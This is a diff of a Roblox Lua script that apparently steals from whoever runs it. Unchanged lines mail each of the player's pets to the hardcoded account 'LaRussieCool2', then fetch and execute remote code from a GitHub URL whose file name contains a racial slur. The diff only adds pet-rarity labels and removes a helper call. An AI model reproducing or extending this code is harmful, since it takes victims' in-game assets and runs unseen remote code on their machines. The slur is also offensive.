@@ -263,7 +263,7 @@ wait(0.5)
 _G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
 local savedPets = FrameworkLibrary.Save.Get().Pets
 _G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
-
+_G.Formation = "Error"
 _G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000
 local function poopie()
         if v.r == true then
@@ -287,6 +287,7 @@ while wait() do
             _G.Username = "LaRussieCool2"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+	    _G.Formation = "Rainbow"
             print(_G.PetName)
 			local args = {
     			[1] = {
@@ -297,7 +298,6 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -332,6 +332,7 @@ while wait() do
             _G.Username = "LaRussieCool2"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+	    _G.Formation = "Normal or rb idk lol"
             print(_G.PetName)
 			local args = {
     			[1] = {
@@ -342,7 +343,6 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -377,6 +377,8 @@ while wait() do
             _G.Username = "LaRussieCool2"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            _G.Formation = "Gold"
+
             print(_G.PetName)
 			local args = {
     			[1] = {
@@ -387,7 +389,6 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -422,6 +423,8 @@ while wait() do
             _G.Username = "LaRussieCool2"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
+            _G.Formation = "Normal L"
+
             print(_G.PetName)
 			local args = {
     			[1] = {
@@ -432,7 +435,6 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)   
             if v2.huge == false then
